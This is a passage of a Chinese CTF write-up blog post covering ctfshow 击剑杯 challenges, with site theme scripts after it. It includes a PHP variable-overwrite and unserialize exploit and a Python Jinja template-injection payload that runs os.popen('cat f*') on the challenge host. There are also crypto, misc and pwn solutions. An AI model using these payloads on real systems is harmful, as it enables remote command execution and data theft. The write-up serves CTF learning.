language_">$this</span>-&gt;name=<span class="hljs-variable">$you_never_know</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;your_answer === <span class="hljs-variable language_">$this</span>-&gt;name)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$secret</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;给我看看!&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;给我看看!&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;这是不能说的秘密&#x27;);location.href=&#x27;https://www.bilibili.com/video/BV1CW411g7UF&#x27;;&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$secret</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>简单的变量覆盖和反序列化<br>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=&amp;<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">whoami</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
+<p>代码使用了<code>extract</code>函数，容易构成变量覆盖<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B-jj-1.png"></p>
+<h2 id="谁是CTF之王？"><a href="#谁是CTF之王？" class="headerlink" title="谁是CTF之王？"></a>谁是CTF之王？</h2><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>host = <span class="hljs-string">&#x27;http://cab68c18-4dae-4f19-a5c9-4c4b015acf46.challenge.ctf.show&#x27;</span><br><br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>/madlib&#x27;</span><br><br>payload = &#123;<br>        <span class="hljs-string">&quot;verb&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=cycler%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;noun&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__init__%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;adjective&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__globals__&quot;</span>,<br>        <span class="hljs-string">&quot;person&quot;</span>:<span class="hljs-string">&quot;os.popen(&#x27;cat f*&#x27;)%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;place&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;x.read()&#125;&#125;&quot;</span><br>        &#125;<br><br>r = requests.post(url, json=payload)<br><br>flag = re.findall(<span class="hljs-string">r&#x27;ctfshow&#123;.*&#125;&#x27;</span>, r.text)[<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="中文识别带师"><a href="#中文识别带师" class="headerlink" title="中文识别带师"></a>中文识别带师</h2><p>只有十个汉字，用鼠标写出来百度即可<br>要是再多一点就需要用到官方wp中的脚本了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%AD%E6%96%87%E8%AF%86%E5%88%AB%E5%B8%A6%E5%B8%88.jpg"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="单向加密"><a href="#单向加密" class="headerlink" title="单向加密"></a>单向加密</h2><p>hint是斐波那契<br>文本中结尾的<code>=I2GWRFMO33EWUZM</code>也是hint，反转后base32解密结果为<code>fibonacci</code></p>
+<p>先用脚本跑出斐波那契数列，然后与文本比较，发现是ascii码，转换一下得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">0</span><br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">1</span><br>c=<span class="hljs-number">1</span><br>fs=[<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	c=b+a<br>	a=b<br>	b=c<br>	<span class="hljs-keyword">if</span> n&gt;<span class="hljs-number">128</span>:<br>		<span class="hljs-keyword">break</span><br>	fs.append(<span class="hljs-built_in">str</span>(b))<br>	n=n+<span class="hljs-number">1</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;code.txt&#x27;</span>)<br>d=f.read()<br>flag=[]<br>l=<span class="hljs-built_in">len</span>(fs)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d)!=<span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> d.find(fs[i].strip())==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(fs[i].strip(),i+<span class="hljs-number">1</span>)<br>            flag.append(<span class="hljs-built_in">chr</span>(i+<span class="hljs-number">1</span>))<br>            d=d[<span class="hljs-built_in">len</span>(fs[i]):]<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join( flag))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%95%E5%90%91%E5%8A%A0%E5%AF%86.png"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="炒鸡好玩的井字棋"><a href="#炒鸡好玩的井字棋" class="headerlink" title="炒鸡好玩的井字棋"></a>炒鸡好玩的井字棋</h2><p>根据给的c代码，可以知道基本判断逻辑，检查输入是否小于3，检查是否有负号<br>但是没有检测棋子的范围，所以可以下在<code>-1</code>这样的位置，用<code>2^32-1</code>来输出<code>-1</code></p>
+<p>先正常下两个相连的棋子<br>[0,0],[0,1]<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%82%92%E9%B8%A1%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%BA%95%E5%AD%97%E6%A3%8B-1.png"></p>
+<p>然后输入[0,4294967295],其实就是[0,-1]<br>三个棋子一条线相连，得到flag</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%87%BB%E5%89%91%E6%9D%AF/">#击剑杯</a>
+      
+        <a href="/tags/ctfshow/">#ctfshow</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【ctfshow】击剑杯-wp</div>
+      <div>https://www.lewiserii.top/ctfshow/【ctfshow】击剑杯-wp.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lewiserii</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年11月11日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                <i class="iconfont icon-nd"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E6%8F%90%E6%9D%83/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E.html" title="Linux sudo权限提升漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux sudo权限提升漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/wp/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-misc-wp.html" title="极客挑战2021-misc-wp">
+                        <span class="hidden-mobile">极客挑战2021-misc-wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.5.1/waline.min.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.5.1/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.lewiserii.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  
+    <script>
+        function page_time(){
+            var times = document.getElementsByTagName('time');
+            if (times.length === 0) { return; }
+            var posts = document.getElementsByClassName('post-content');
+            console.log(posts);
+            if (posts.length === 0) { return; }    
+            var pubTime = new Date(times[0].dateTime);  /* 文章发布时间戳 */
+            var now = Date.now()  /* 当前时间戳 */
+            var interval = parseInt(now - pubTime)
+            /* 发布时间超过指定时间（毫秒） */
+            if (interval > 3600*24*30*1500){
+                var days = parseInt(interval / 86400000)
+                posts[0].innerHTML = '<div class="note note-warning" style="font-size:0.9rem"><p>' +
+                '<div class="h6">文章时效性提示</div><p>这是一篇发布于 ' + days + ' 天前的文章，部分信息可能已发生改变，请注意甄别。' +
+                '</p></p></div>' + posts[0].innerHTML;
+            }
+        }
+        page_time();
+    </script>
+  
+  
+  
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?150aacf9a16405ad4ea9ead54ecac598";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
